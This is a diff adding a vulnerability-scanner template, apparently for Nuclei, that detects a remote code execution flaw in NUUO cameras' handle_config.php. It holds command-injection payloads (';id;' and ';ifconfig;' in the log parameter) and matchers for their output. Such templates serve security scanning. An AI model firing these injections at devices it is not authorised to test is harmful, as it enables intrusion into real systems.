@@ -1,0 +1,37 @@
+id: nuuo-camera-handle-config-rce
+info:
+  name: NUUO Camera handle_config Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,nuuo_camera
+http:
+  - raw:
+      - |
+        GET /handle_config.php?log=;id; HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/mtd"
+          - "uid="
+          - "gid="
+        part: body
+  - raw:
+      - |
+        GET /handle_config.php?log=;ifconfig; HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/mtd"
+          - "eth0"
+          - "Link encap"
+        part: body
